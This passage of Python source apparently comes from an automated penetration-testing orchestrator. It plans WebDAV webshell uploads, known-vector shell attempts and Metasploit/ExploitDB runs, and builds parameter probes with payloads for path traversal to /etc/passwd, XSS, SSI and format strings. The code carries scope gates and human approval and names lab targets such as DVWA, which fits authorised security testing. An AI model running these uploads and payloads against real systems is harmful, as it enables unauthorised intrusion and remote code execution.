# roughly by how often each is writable; the deploy tries them in turn.
_DAV_CANDIDATE_PATHS = ("/dav/", "/webdav/", "/uploads/", "/upload/", "/files/",
                        "/data/", "/media/", "/images/", "/tmp/", "/")


def _webshell_ref(ip, port, scheme, paths, wid_s="WSTG-CONF-06") -> dict:
    """Build the webshell dispatch ref. `paths` is the ORDERED list of collections
    the deploy will try (permissive: it walks them until one accepts a webshell).
    `path` is kept as the first entry for back-compat with older readers."""
    paths = [p if str(p).endswith("/") else str(p) + "/" for p in (paths or ["/dav/"])]
    # exploit_type must satisfy the pending_exploits CHECK constraint; a webshell
    # upload IS a file_upload (leading to RCE). dispatch_source='webshell' is what
    # execute-by-id branches on — the exploit_type is metadata.
    return {"source": "wstg", "dispatch_source": "webshell",
            "exploit_type": "file_upload", "module": wid_s,
            "parameters": {"vector": "webdav_put", "path": paths[0],
                           "paths": paths, "scheme": scheme},
            "purpose": "WSTG-CONF-06 writable PUT/WebDAV -> webshell RCE"}


def _webshell_ref_from_url(url, ip, port, wid_s="WSTG-CONF-06") -> dict:
    """Ref for a webshell test derived from a finding URL (the WSTG map path).
    Tries the finding's own collection first, then the common candidate list."""
    scheme, path = "http", "/dav/"
    try:
        if url:
            import urllib.parse as _up
            u = _up.urlparse(url if "://" in str(url) else f"http://{url}")
            scheme = u.scheme or "http"
            p = u.path or "/dav/"
            if not p.endswith("/"):
                p = p.rsplit("/", 1)[0] + "/"
            path = p or "/dav/"
    except Exception:  # noqa: BLE001
        pass
    norm = [pp if pp.endswith("/") else pp + "/" for pp in _DAV_CANDIDATE_PATHS]
    paths = [path] + [pp for pp in norm if pp != path]
    return _webshell_ref(ip, port, scheme, paths, wid_s)


def _host_in_scope(host: str) -> bool:
    """Fail-closed scope check for a planner-time recon probe. The OPTIONS method
    test below sends real traffic, so it passes the same gate as any dispatch —
    if the scope cannot be read, refuse (return False). Uses the canonical
    one-line enforcer (connect + load + check) so this path can never drift from
    every other dispatcher's gate."""
    try:
        from etl.scope_gate import enforce_target_scope
        return enforce_target_scope(host) is None
    except Exception:  # noqa: BLE001
        return False


def _detect_webdav(scheme: str, ip, port, path: str):
    """WSTG-CONF-06 OPTIONS probe. Returns the collection path when it advertises
    WebDAV (a `DAV:` header, `MS-Author-Via`, or PUT in Allow), else None.
    Read-only — writability is proven later by the gated PUT in the exploit-runner."""
    try:
        import httpx as _hx
        url = f"{scheme}://{ip}:{port}{path}"
        with _hx.Client(verify=False, timeout=10, follow_redirects=True) as c:
            r = c.request("OPTIONS", url)
        hdr = {k.lower(): v for k, v in r.headers.items()}
        allow = (hdr.get("allow") or "").upper()
        if hdr.get("dav") or "ms-author-via" in hdr or "PUT" in allow:
            return path if path.endswith("/") else path + "/"
    except Exception:  # noqa: BLE001
        return None
    return None


def _wstg_conf06_webshell_tests(items: list) -> list:
    """WSTG-CONF-06 (Test HTTP Methods): the OWASP way this vector is found.

    The deterministic recommender is service+port-keyed (http/80 -> canned MSF
    aux modules) and never inspects the banner, so a writable WebDAV collection
    was invisible to it. This runs the actual WSTG-CONF-06 method test — a
    scope-gated OPTIONS probe on candidate collections — and, when a WebDAV
    collection answers, emits an IMPACTFUL `webshell_upload` test carrying the
    WSTG map's assertion. The PUT itself is gated: it runs only after the human
    approval interrupt, in the exploit-runner's `source=webshell` branch."""
    out, seen = [], set()
    # Assertion is fixed here rather than via get_wstg_guidance: the map's SAFE
    # `http_methods` (method_check) entry shares CWE-650 and shadows the match,
    # so a lookup would return the wrong (detection) assertion. This is the
    # impactful ESCALATION — a passing run must show command output.
    assertion = {"expect_regex": "(?i)(uid=[0-9]|gid=[0-9]|PXWEBSHELL_OK)"}
    wid_s = "WSTG-CONF-06"
    for row in items:
        svc = (row.get("service") or "").strip().lower()
        if svc not in _SERVICE_FAMILIES_WEB:
            continue
        port, ip = row.get("port"), row.get("ip")
        if not ip or (ip, port) in seen:
            continue
        seen.add((ip, port))
        if not _host_in_scope(ip):
            continue
        scheme = "https" if _tls_state(svc, row.get("product"), row.get("banner")) == "yes" else "http"
        # PERMISSIVE: emit ONE webshell candidate for EVERY in-scope web service.
        # The OPTIONS probe below only PRIORITISES which collection to try first —
        # it does not gate. A server that accepts PUT without advertising DAV/PUT
        # (Tomcat readonly=false, a stray upload dir) is still attempted; the
        # gated PUT at execution is the proof, and the deploy walks the whole
        # candidate list until one lands (or all fail cleanly).
        detected = [p if p.endswith("/") else p + "/"
                    for p in _DAV_CANDIDATE_PATHS
                    if _detect_webdav(scheme, ip, port, p)]
        norm = [p if p.endswith("/") else p + "/" for p in _DAV_CANDIDATE_PATHS]
        paths = detected + [p for p in norm if p not in detected]
        url = f"{scheme}://{ip}:{port}{paths[0]}"
        ref = _webshell_ref(ip, port, scheme, paths, wid_s)
        label = "WebDAV advertised" if detected else "PUT unadvertised — trying anyway"
        out.append({
            "name": f"WSTG-CONF-06 webshell_upload ({label}) @ {scheme}://{ip}:{port}",
            "host": ip, "service": "http", "port": port, "tool": "webshell",
            "command": None, "category": "webshell_upload", "tier": "impactful",
            "assertion": assertion,
            "exploit_ref": ref,
        })
    return out


# Parameter-name heuristics → the OWASP class each implies. Object references get
# an IDOR test; path-like params get an LFI test; EVERY param gets SQLi + XSS.
_IDOR_PARAM_NAMES = {"id", "uid", "userid", "user_id", "user", "username", "account",
                     "acct", "pid", "cid", "doc", "docid", "document_id", "file_id",
                     "fileid", "order", "order_id", "orderid", "item", "itemid",
                     "record", "rid", "object", "oid", "customer", "invoice",
                     "message", "msgid", "note", "profile", "aid", "gid", "author",
                     "blogger", "owner", "email", "member", "group", "role", "level"}
_PATH_PARAM_NAMES = {"file", "page", "path", "include", "inc", "template", "tpl",
                     "doc", "document", "dir", "folder", "load", "read", "view",
                     "download", "filename", "url", "site", "conf", "config",
                     "textfile", "text_file", "pg", "action", "cat", "lang", "style"}


# Curated list of intentionally-vulnerable / high-value web apps that generic
# wordlists (common.txt, even 43k-line raft) do NOT contain. Shipped in
# wordlists/ (bind-mounted into kali-listener at /wordlists).
_KNOWN_APPS_WORDLIST = os.environ.get(
    "KNOWN_APPS_WORDLIST", "/wordlists/known-web-apps.txt")


_WEB_PIPELINE_MAX_PORTS = int(os.environ.get("WEB_PIPELINE_MAX_PORTS", "3"))


def _ensure_web_pipeline(host: str, sid, engagement_id=None) -> dict:
    """Hands-off: auto-trigger the comprehensive web pipeline
    (Gobuster→Nikto→Playwright→Katana→ZAP→Nuclei, ZAP pre-seeded + in-scope) for a
    host's web services, so the app-layer surface (DVWA/Mutillidae params, ZAP
    alerts) is populated WITHOUT a manual step. Scope-gated; deduped (skips if a
    ZAP/katana scan produced findings for this host in the last 6h); fire-and-
    forget — the pipeline is long-running, so its findings drive the NEXT surface
    cycle (the coverage loop re-drives). Bounded to _WEB_PIPELINE_MAX_PORTS."""
    if not _host_in_scope(host):
        return {"skipped": "out-of-scope"}
    try:
        ports = json.loads(_tool(scan_tools.query_open_ports, target=host, limit=100))
        items = ports.get("items") or []
    except Exception:  # noqa: BLE001
        return {"skipped": "no ports"}
    web = [(r.get("port"), _tls_state(r.get("service"), r.get("product"), r.get("banner")))
           for r in items
           if (r.get("service") or "").strip().lower() in _SERVICE_FAMILIES_WEB and r.get("port")]
    if not web:
        return {"skipped": "no web services"}
    # Dedup: don't re-run a heavy pipeline if one recently produced findings.
    try:
        import psycopg2
        from db_utils import get_db_dsn
        with psycopg2.connect(get_db_dsn()) as conn, conn.cursor() as cur:
            cur.execute(
                """SELECT count(*) FROM web_findings wf JOIN assets a ON wf.asset_id = a.id
                    WHERE regexp_replace(a.ip::text,'/[0-9]+$','') = %s
                      AND wf.source IN ('zap','katana','nuclei','nikto')
                      AND wf.last_seen > now() - interval '6 hours'""",
                (host,))
            recent = cur.fetchone()[0]
        if recent:
            return {"skipped": f"recent web scan ({recent} findings <6h)"}
    except Exception:  # noqa: BLE001
        pass
    dispatched = []
    for port, tls in web[:_WEB_PIPELINE_MAX_PORTS]:
        scheme = "https" if tls == "yes" else "http"
        url = f"{scheme}://{host}:{port}"
        try:
            res = json.loads(_tool(scan_tools.start_pipeline_scan, target_url=url))
            dispatched.append({"url": url, "job_id": res.get("job_id")})
        except Exception as e:  # noqa: BLE001
            _msg(sid, "SurfaceTester", f"[web pipeline dispatch failed for {url}: {e}]")
    if dispatched:
        _msg(sid, "SurfaceTester",
             f"[web pipeline] dispatched {len(dispatched)} comprehensive web scan(s) "
             f"(Gobuster→…→ZAP→Nuclei) — the app-layer findings they produce (SQLi/"
             f"XSS/IDOR surface) will drive the next surface cycle.")
        _emit("langgraph_web_pipeline_dispatched", sid,
              {"host": host, "dispatched": len(dispatched),
               "urls": [d["url"] for d in dispatched]})
    return {"dispatched": dispatched}


def _known_app_discovery_tests(items: list) -> list:
    """One safe gobuster probe per web port against the curated vulnerable-app
    list — so DVWA / Mutillidae / tikiwiki are DISCOVERED (they answer 301/200),
    which is the prerequisite for crawling their app-layer surface and generating
    the OWASP param tests. Safe lane; gobuster is allow-listed."""
    out, seen = [], set()
    for row in items:
        svc = (row.get("service") or "").strip().lower()
        if svc not in _SERVICE_FAMILIES_WEB:
            continue
        port, ip = row.get("port"), row.get("ip")
        if not ip or (ip, port) in seen:
            continue
        seen.add((ip, port))
        scheme = "https" if _tls_state(svc, row.get("product"), row.get("banner")) == "yes" else "http"
        out.append({
            "name": f"app_discovery known-vuln-apps @ {scheme}://{ip}:{port}",
            "host": ip, "service": "http", "port": port, "tool": "gobuster",
            "command": f"gobuster dir -u {scheme}://{ip}:{port}/ -w {_KNOWN_APPS_WORDLIST} -q -t 10",
            "category": "dir_enum", "tier": "safe",
            "assertion": {"expect_regex": r"(?i)status: ?(200|301|302)"},
            "exploit_ref": None,
            "source_finding_id": None, "source_finding_source": None,
        })
    return out


def _svc_test(category, tool, wid, ip, port, command, assertion) -> dict:
    scheme = "https" if str(port) in ("443", "8443") else "http"
    return {"name": f"WSTG {wid} {category} @ {scheme}://{ip}:{port}",
            "host": ip, "service": "http", "port": port, "tool": tool,
            "command": command, "category": category, "tier": "safe",
            "assertion": assertion, "exploit_ref": None,
            "source_finding_id": None, "source_finding_source": "wstg-service"}


def _owasp_service_tests(items: list) -> list:
    """Tier-2 WSTG probes generated per WEB SERVICE (not per finding/param):
    HSTS (CONF-07), cross-domain policy (CONF-08), cloud storage / exposures
    (CONF-11), and cache-control on the root (ATHN-06). All safe, read-only
    curl/nuclei detections — these close config-level WSTG gaps that were only
    reachable reactively before."""
    out, seen = [], set()
    for row in items:
        svc = (row.get("service") or "").strip().lower()
        if svc not in _SERVICE_FAMILIES_WEB:
            continue
        port, ip = row.get("port"), row.get("ip")
        if not ip or (ip, port) in seen:
            continue
        seen.add((ip, port))
        tls = _tls_state(svc, row.get("product"), row.get("banner"))
        scheme = "https" if tls == "yes" else "http"
        base = f"{scheme}://{ip}:{port}"
        # HSTS (CONF-07) — only meaningful over TLS; the ISSUE is the header's
        # absence, so a "pass" = missing header (expect_not_substring).
        if tls == "yes":
            out.append(_svc_test("hsts_check", "curl", "WSTG-CONF-07", ip, port,
                f"curl -sk -I {base}/",
                {"expect_not_substring": ["Strict-Transport-Security", "strict-transport-security"]}))
        # Cross-domain policy (CONF-08) — a permissive allow-access-from is the issue.
        out.append(_svc_test("crossdomain_check", "curl", "WSTG-CONF-08", ip, port,
            f"curl -sk {base}/crossdomain.xml",
            {"expect_regex": "(?i)cross-domain-policy|allow-access-from"}))
        # Cloud storage / exposures (CONF-11) — nuclei tag sweep.
        out.append(_svc_test("cloud_storage", "nuclei", "WSTG-CONF-11", ip, port,
            f"nuclei -u {base} -tags exposure,aws,s3,gcp,azure,bucket -silent",
            {"expect_regex": r"\[[a-z0-9-]+\]"}))
        # Cache-control on the root (ATHN-06) — no-store absent is the flag.
        out.append(_svc_test("cache_check", "curl", "WSTG-ATHN-06", ip, port,
            f"curl -sk -I {base}/",
            {"expect_not_substring": ["no-store", "No-Store", "no-cache"]}))
    return out


def _owasp_param_tests(host: str, limit: int = 16) -> list:
    """Turn CRAWLED parameterized endpoints into OWASP WSTG app-layer tests —
    the IDOR / SQLi / XSS / LFI coverage a service+port-keyed recommender never
    produces. For a target like Metasploitable's DVWA/Mutillidae this is where
    the real application bugs live. Reads the host's crawled URLs (any source)
    that carry a query string, classifies each parameter, and emits the tests.
    Scope-gated (the URLs are for one in-scope host); execution is still gated
    per-tier (SQLi/XSS/LFI safe, IDOR human-approved)."""
    import re as _re
    import urllib.parse as _up
    try:
        import psycopg2
        from db_utils import get_db_dsn
        with psycopg2.connect(get_db_dsn()) as conn, conn.cursor() as cur:
            cur.execute(
                """SELECT DISTINCT wf.url
                     FROM web_findings wf JOIN assets a ON wf.asset_id = a.id
                    WHERE regexp_replace(a.ip::text,'/[0-9]+$','') = %s
                      AND wf.url LIKE '%%?%%'
                    LIMIT 400""",
                (host,))
            urls = [r[0] for r in cur.fetchall() if r[0]]
    except Exception:  # noqa: BLE001
        return []
    if not _host_in_scope(host):
        return []

    out, seen = [], set()
    for raw in urls:
        u = _up.urlparse(raw if "://" in str(raw) else f"http://{raw}")
        if not u.query:
            continue
        base = f"{u.scheme or 'http'}://{u.netloc}{u.path}"
        port = u.port or (443 if u.scheme == "https" else 80)
        for pname, pvals in _up.parse_qs(u.query).items():
            low = pname.lower()
            pval = (pvals or [""])[0]
            key = (base, low)
            if key in seen or len(out) >= limit:
                continue
            seen.add(key)
            # Rebuild the query with a placeholder we can substitute per test.
            def _with(val):
                q = _up.parse_qs(u.query); q[pname] = [val]
                return f"{base}?{_up.urlencode(q, doseq=True)}"

            # SQLi — safe detection via sqlmap (allow-listed), scoped to this param.
            out.append(_param_test("sqli_detect", "sqlmap", base, pname, port,
                f"sqlmap -u \"{raw}\" -p {pname} --batch --smart --level 1 --risk 1 --flush-session",
                {"expect_regex": "(?i)(is vulnerable|injectable|parameter .* is|payload)"}))
            # XSS — safe reflection probe: does a marker payload come back verbatim?
            xurl = _with("pxXSS<svg/onload=1>")
            out.append(_param_test("xss_detect", "curl", base, pname, port,
                f"curl -sk \"{xurl}\"",
                {"expect_substring": ["pxXSS<svg/onload=1>"]}))
            # LFI — path-like params only.
            if low in _PATH_PARAM_NAMES:
                lurl = _with("../../../../../../etc/passwd")
                out.append(_param_test("lfi_read", "curl", base, pname, port,
                    f"curl -sk \"{lurl}\"", {"expect_substring": ["root:x:0:0"]}))
            # SSI injection (INPV-08) — an echo directive that executes returns a
            # server value instead of the literal.
            surl = _with('<!--#echo var="DATE_LOCAL"-->')
            out.append(_param_test("ssi_detect", "curl", base, pname, port,
                f"curl -sk \"{surl}\"",
                {"expect_not_substring": ["<!--#echo", "&lt;!--#echo"]}, wid="WSTG-INPV-08"))
            # Format string (INPV-13) — %n/%s/%x tends to surface an error or artifact.
            furl2 = _with("%25n%25s%25x%25x%25x")
            out.append(_param_test("format_string", "curl", base, pname, port,
                f"curl -sk \"{furl2}\"",
                {"expect_regex": r"(?i)(warning|fatal|segmentation|0x[0-9a-f]{6}|va_arg)"},
                wid="WSTG-INPV-13"))
            # HTTP Parameter Pollution (INPV-04) — duplicate the param; both
            # markers surviving (or a concat) signals HPP-relevant handling.
            hurl = f"{base}?{_up.urlencode({pname:['pxHPP1','pxHPP2']}, doseq=True)}"
            out.append(_param_test("hpp_detect", "curl", base, pname, port,
                f"curl -sk \"{hurl}\"",
                {"expect_regex": "(?i)pxHPP1.*pxHPP2|pxHPP2.*pxHPP1|pxHPP1pxHPP2"},
                wid="WSTG-INPV-04"))
            # IDOR — object-ref params. Impactful + gated: confirming needs a
            # second identity, so this ENUMERATES the reference for the operator.
            if low in _IDOR_PARAM_NAMES:
                out.append(_param_test("idor", "curl", base, pname, port,
                    f"curl -sk \"{raw}\"", {"expect_status": 200},
                    impactful=True, wid="WSTG-ATHZ-04"))
            if len(out) >= limit:
                break
    return out


def _param_test(category, tool, base, pname, port, command, assertion,
                impactful=False, wid=None) -> dict:
    wmap = {"sqli_detect": "WSTG-INPV-05", "xss_detect": "WSTG-INPV-01,WSTG-INPV-02",
            "lfi_read": "WSTG-ATHZ-01", "idor": "WSTG-ATHZ-04"}
    wid = wid or wmap.get(category, "WSTG")
    ip = base.split("://", 1)[-1].split("/")[0].split(":")[0]
    tier = "impactful" if impactful else "safe"
    ref = ({"source": "wstg", "module": wid, "purpose": f"{wid} {category} on {pname}"}
           if impactful else None)
    return {"name": f"WSTG {wid} {category} @ {base}?{pname}=",
            "host": ip, "service": "http", "port": port, "tool": tool,
            "command": command, "category": category, "tier": tier,
            "assertion": assertion, "exploit_ref": ref,
            "source_finding_id": None, "source_finding_source": "crawl-param"}


def _vector_catalog():
    """(load_methods, match_method) from the shared vector catalogue, or (None,
    None) if unavailable. Reused so advice and attempts never drift."""
    try:
        from etl.dead_port_advisor import load_methods, match_method
        return load_methods, match_method
    except Exception:  # noqa: BLE001
        try:
            from dead_port_advisor import load_methods, match_method  # type: ignore
            return load_methods, match_method
        except Exception:  # noqa: BLE001
            return None, None


def _vector_covered_keys(target: str):
    """(target-scoped) set of vector_ids already proven `shell` or with a live
    (planned/not_attempted after a pending) attempt — the dedup guard so a
    one-shot mutating backdoor is never re-fired and pending_exploits don't churn."""
    keys = set()
    try:
        from db_utils import get_db
        with get_db() as conn, conn.cursor() as cur:
            cur.execute("SELECT vector_id FROM vector_coverage "
                        "WHERE target = %s AND result = 'shell'", (target,))
            keys = {r[0] for r in cur.fetchall()}
    except Exception as e:  # noqa: BLE001
        _log.debug("vector coverage read failed for %s: %s", target, e)
    return keys


def _vector_coverage_upsert(engagement_id, target, port, vector_id, service,
                            source_path, mutates, result, *,
                            pending_exploit_id=None, exploit_result_id=None):
    """Record/refresh a vector_coverage row. Applicability is written at plan time
    (`planned`) so 'applicable but never attempted' is visible, not silent — the
    whole point of closing the loop. Best-effort; never breaks the caller."""
    try:
        from db_utils import get_db
        attempted = result not in ("planned", "not_attempted")
        with get_db() as conn, conn.cursor() as cur:
            cur.execute(
                """
                INSERT INTO public.vector_coverage
                  (engagement_id, target, port, vector_id, service, attempted,
                   result, source_path, mutates, pending_exploit_id,
                   exploit_result_id, last_attempt_at)
                VALUES (%s::uuid,%s,%s,%s,%s,%s,%s,%s,%s,%s::uuid,%s::uuid,
                        CASE WHEN %s THEN now() ELSE NULL END)
                ON CONFLICT (COALESCE(engagement_id,
                    '00000000-0000-0000-0000-000000000000'::uuid),
                    target, COALESCE(port,-1), vector_id) DO UPDATE SET
                  service = EXCLUDED.service,
                  attempted = public.vector_coverage.attempted OR EXCLUDED.attempted,
                  -- never downgrade a proven shell
                  result = CASE WHEN public.vector_coverage.result = 'shell'
                                THEN 'shell' ELSE EXCLUDED.result END,
                  source_path = COALESCE(EXCLUDED.source_path, public.vector_coverage.source_path),
                  mutates = EXCLUDED.mutates,
                  pending_exploit_id = COALESCE(EXCLUDED.pending_exploit_id, public.vector_coverage.pending_exploit_id),
                  exploit_result_id = COALESCE(EXCLUDED.exploit_result_id, public.vector_coverage.exploit_result_id),
                  last_attempt_at = COALESCE(EXCLUDED.last_attempt_at, public.vector_coverage.last_attempt_at)
                """,
                (engagement_id, target, port, vector_id, service, attempted,
                 result, source_path, bool(mutates),
                 str(pending_exploit_id) if pending_exploit_id else None,
                 str(exploit_result_id) if exploit_result_id else None, attempted))
            conn.commit()
    except Exception as e:  # noqa: BLE001
        _log.debug("vector coverage upsert failed (%s/%s): %s", target, vector_id, e)


def _update_vector_coverage_from_run(sid, test, success, session_id, output,
                                     pending_id, exploit_result_id):
    """Update vector_coverage after a vector attempt ran. Reuses the session's
    engagement_id so the ON CONFLICT identity matches the plan-time `planned` row
    (a different engagement_id would insert a duplicate instead of updating)."""
    vec = (test or {}).get("vector")
    if not vec:
        return
    try:
        cfg = (get_agent_session(_sid(sid)) or {}).get("configuration") or {}
        eid = cfg.get("engagement_id") if isinstance(cfg, dict) else None
        assertion = test.get("assertion") or {}
        got_shell = bool(success) and (bool(session_id) or bool(assertion.get("expect_shell")))
        low = (output or "").lower()
        blocked = ("out-of-scope" in low or "out of scope" in low
                   or ("scope" in low and "refus" in low))
        result = "shell" if got_shell else ("blocked" if blocked else "no_shell")
        _vector_coverage_upsert(
            eid, test.get("host"), test.get("port"), vec["vector_id"],
            test.get("service"), vec.get("source_path"), vec.get("mutates"),
            result, pending_exploit_id=pending_id, exploit_result_id=exploit_result_id)
    except Exception as e:  # noqa: BLE001
        _log.debug("vector coverage run-update failed: %s", e)


def _service_vector_tests(items: list) -> list:
    """Independent, data-driven attempts of KNOWN service vectors — the platform
    trying the vectors itself rather than hoping the MSF planner picks them.

    For each open service that matches a catalogue vector (knowledge/
    service_access_methods.yaml, via the advisor's most-specific-wins matcher)
    emit up to two IMPACTFUL candidates: the runnable NON-MSF `attempt`
    (dispatch=command, the primary lane) and an MSF seed (`msf`). Both route to
    the approval/pre-approval gate via surface_plan. Each candidate carries a
    `vector` block so surface_plan records vector_coverage.
    """
    load_methods, match_method = _vector_catalog()
    if not (load_methods and match_method):
        return []
    methods = load_methods()
    if not methods:
        return []
    out, seen = [], set()

    def _render(t, ip, port, vec):
        if not t:
            return t
        return (str(t).replace("{target}", str(ip))
                .replace("{port}", str(port or vec.get("port") or ""))
                .replace("{opens}", str(vec.get("opens") or "")))

    for row in items:
        ip = row.get("ip")
        if not ip:
            continue
        port = row.get("port")
        svc = (row.get("service") or "").strip().lower()
        product = (row.get("product") or "").strip()
        version = (row.get("version") or "").strip()
        matched = []
        best = match_method(methods, service=svc, product=product, version=version)
        if best:
            matched.append(best)
        # Port-keyed vectors too — catches nmap mislabels (e.g. 6200 as lm-x).
        for e in methods:
            if e.get("port") == port and e not in matched:
                matched.append(e)
        for vec in matched:
            vid = vec.get("id")
            eport = port or vec.get("port")
            svc_out = svc or vec.get("service")
            mutates = bool(vec.get("mutates"))
            disp = vec.get("dispatch")
            # NON-MSF command (primary lane)
            if vec.get("attempt") and disp in (None, "command"):
                k = (ip, eport, vid, "command")
                if k not in seen:
                    seen.add(k)
                    cmd = _render(vec["attempt"], ip, eport, vec)
                    out.append({
                        "name": f"vector {vid} (command) @ {ip}:{eport}",
                        "host": ip, "service": svc_out, "port": eport,
                        "tool": (cmd.split() or ["sh"])[0], "command": cmd,
                        "category": "vector_attempt", "tier": "impactful",
                        "assertion": vec.get("success") or {"expect_shell": True},
                        "exploit_ref": {"source": "command", "dispatch_source": "command",
                                        "exploit_type": "rce", "module": vid,
                                        "parameters": {"vector_id": vid,
                                                       "success": vec.get("success"),
                                                       "opens": vec.get("opens"),
                                                       "mutates": mutates}},
                        "vector": {"vector_id": vid, "source_path": "command",
                                   "mutates": mutates},
                    })
            # MSF seed (complementary)
            if vec.get("msf"):
                k = (ip, eport, vid, "msf")
                if k not in seen:
                    seen.add(k)
                    out.append({
                        "name": f"vector {vid} (msf {vec['msf']}) @ {ip}:{eport}",
                        "host": ip, "service": svc_out, "port": eport,
                        "tool": "metasploit", "command": None,
                        "category": "vector_attempt", "tier": "impactful",
                        "assertion": vec.get("success") or {"expect_shell": True},
                        "exploit_ref": {"source": "metasploit", "dispatch_source": "metasploit",
                                        "exploit_type": "rce", "module": vec["msf"]},
                        "vector": {"vector_id": vid, "source_path": "msf",
                                   "mutates": mutates},
                    })
    return out


def _build_surface_tests(host: str, synthesize: bool = None) -> list:
    """Deterministic (no LLM) custom tests for ONE host's surface.

    Reuses query_open_ports(target=host) + get_tool_recommendations per service.
    Each element becomes a candidate test dict with a structured assertion and a
    safe|impactful tier. Impactful candidates carry an exploit_ref (from the
    recommender's metasploit[] or match_vuln_to_exploits) so they route to the
    approval lane; nothing here executes.
    """
    tests: list = []
    try:
        ports = json.loads(_tool(scan_tools.query_open_ports, target=host, limit=100))
        items = ports.get("items") or []
    except Exception:  # noqa: BLE001
        items = []

    # WSTG-CONF-06 (Test HTTP Methods) FIRST: a writable WebDAV collection is a
    # direct RCE (upload a webshell), the highest-value vector on the host — it
    # must never be crowded out of the _SURFACE_TEST_LIMIT budget by lower-value
    # probes. Detected up front and prepended.
    tests.extend(_wstg_conf06_webshell_tests(items))

    # Non-MSF exploit coverage: ExploitDB scripts matched by (product, version).
    tests.extend(_exploitdb_tests(items))

    # Independent known-vector coverage: for each open service that matches the
    # vector catalogue, try its NON-MSF command AND seed the MSF module — so the
    # classic vectors (samba usermap, rsh, nfs, unrealircd, distcc, drb, vnc,
    # mysql/postgres/tomcat, vsftpd, php-cgi) are attempted every run, not left
    # to the LLM planner's incidental coverage.
    tests.extend(_service_vector_tests(items))

    # Discover known vulnerable web apps (DVWA/Mutillidae/etc.) that generic
    # wordlists miss — so their app-layer surface can then be crawled + tested.
    tests.extend(_known_app_discovery_tests(items))

    # OWASP app-layer coverage: IDOR / SQLi / XSS / LFI from crawled parameters.
    tests.extend(_owasp_param_tests(host))

    # Tier-2 WSTG service-level probes: HSTS / cross-domain / cloud / cache.
    tests.extend(_owasp_service_tests(items))

    # Infer the target OS family once, to drop platform-mismatched MSF modules.
    _plat = _infer_target_platform(items)

    seen = set()
    for row in items:
        svc = (row.get("service") or "").strip().lower()
        port, ip = row.get("port"), row.get("ip") or host
        if not svc or (svc, port) in seen:
            continue
        seen.add((svc, port))
        if len(tests) >= _SURFACE_TEST_LIMIT:
            break
        tls = _tls_state(svc, row.get("product"), row.get("banner"))
        try:
            rec = json.loads(_tool(scan_tools.get_tool_recommendations,
                                   service=svc, port=port))
        except Exception:  # noqa: BLE001
            rec = {}
        rec_tools = {(_tool_head(t.get("command") or t.get("name") or "")): t
                     for t in (rec.get("tools") or [])}

        # SAFE candidates from the service's read-only probe set.
        for category, default_tool in _surface_categories_for(svc, tls):
            rt = rec_tools.get(default_tool)
            cmd = (rt.get("command") if rt else None)
            if cmd:
                cmd = cmd.replace("{target}", str(ip))
                cmd = _bound_safe_command(cmd, ip, port)
            else:
                scheme = "https" if tls == "yes" else "http"
                cmd = {
                    # Present + allowlisted in the kali image (see _surface_categories_for).
                    "whatweb": f"whatweb -a 3 --color=never {scheme}://{ip}:{port}",
                    "nuclei": f"nuclei -u {scheme}://{ip}:{port} -silent",
                    # seclists is installed; /usr/share/wordlists/dirb/ is not.
                    "gobuster": f"gobuster dir -u {scheme}://{ip}:{port} -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -q",
                    "sslscan": f"sslscan {ip}:{port}",
                    "enum4linux-ng": f"enum4linux-ng -A {ip}",
                    "ssh-audit": f"ssh-audit {ip}:{port}",
                    "snmpwalk": f"snmpwalk -v2c -c public {ip}",
                    "nmap": f"nmap -sV -Pn --host-timeout 120s -p {port} {ip}",
                }.get(default_tool, f"nmap -sV -Pn --host-timeout 120s -p {port} {ip}")
            tier = _classify(category, cmd, has_exploit_ref=False)
            tests.append({
                "name": f"{category} {svc}/{port} @ {ip}",
                "host": ip, "service": svc, "port": port, "tool": _tool_head(cmd),
                "command": cmd, "category": category, "tier": tier,
                "assertion": _assertion_for(category, tls),
                "exploit_ref": None,
            })

        # IMPACTFUL candidates: metasploit modules the recommender named.
        scheme = "https" if tls == "yes" else "http"
        existing_cmds = {t.get("command") for t in tests if t.get("command")}
        for m in _rank_msf(rec.get("metasploit"), platform=_plat):
            module = m.get("module") or m.get("name")
            if not module:
                continue
            # Read-only info scanners (robots.txt/version/header/cert/dir listing)
            # run in the SAFE autonomous lane via curl/sslscan/gobuster instead of
            # as an approval-gated MSF session — the operator should not have to
            # approve a robots.txt fetch. Skip if that safe command is already
            # queued for this host (the read-only probe set often covers it).
            alt = _safe_alt_for_msf(module, ip, port, scheme)
            if alt:
                alt_cat, alt_cmd = alt
                alt_cmd = _bound_safe_command(alt_cmd, ip, port)
                if alt_cmd in existing_cmds:
                    continue
                existing_cmds.add(alt_cmd)
                tests.append({
                    "name": f"{alt_cat} {svc}/{port} @ {ip}",
                    "host": ip, "service": svc, "port": port, "tool": _tool_head(alt_cmd),
                    "command": alt_cmd,
                    "category": alt_cat,
                    "tier": _classify(alt_cat, alt_cmd, has_exploit_ref=False),
                    "assertion": _assertion_for(alt_cat, tls),
                    "exploit_ref": None,
                })
                continue
            tests.append({
                "name": f"msf_exploit {module} @ {ip}",
                "host": ip, "service": svc, "port": port, "tool": "metasploit",
                "command": None, "category": "msf_exploit", "tier": "impactful",
                "assertion": {"expect_shell": True},
                "exploit_ref": {"source": "metasploit", "module": module,
                                "purpose": m.get("purpose")},
            })

    # WSTG finding-driven tests: turn each of the host's WEB findings into the
    # OWASP-WSTG-guided test that proves it. The map (rag-api /rag/wstg) keys a
    # finding by issue_type / CWE / nuclei tag / name to a tier+category+command+
    # assertion. Safe probes run in the autonomous lane; impactful ones carry a
    # 'wstg' exploit_ref so surface_plan queues them for the SAME human approval
    # as any other impactful test. `_classify` still fails safe on top of this.
    try:
        web = json.loads(_tool(scan_tools.get_web_findings, target=host, limit=100))
        findings = (web.get("findings") or web.get("web_findings")
                    or web.get("items") or [])
    except Exception:  # noqa: BLE001
        findings = []

    # Web ports (and their scheme) for THIS host — used to (a) skip web
    # finding-driven tests on non-web ports (a header_check on :22/SSH would
    # just hang) and (b) give a bare host:port URL a proper http(s):// scheme.
    _web_ports, _port_scheme = {}, {}
    for row in items:
        svc = (row.get("service") or "").strip().lower()
        p = row.get("port")
        if svc in _SERVICE_FAMILIES_WEB and p is not None:
            _web_ports[p] = svc
            _port_scheme[p] = "https" if _tls_state(
                svc, row.get("product"), row.get("banner")) == "yes" else "http"

    def _web_url(url, ip, port):
        """Ensure a web test URL carries an http(s):// scheme."""
        if url and str(url).startswith(("http://", "https://")):
            return url
        scheme = _port_scheme.get(port, "https" if str(port) in ("443", "8443") else "http")
        return f"{scheme}://{ip}:{port}" if port else f"{scheme}://{ip}"

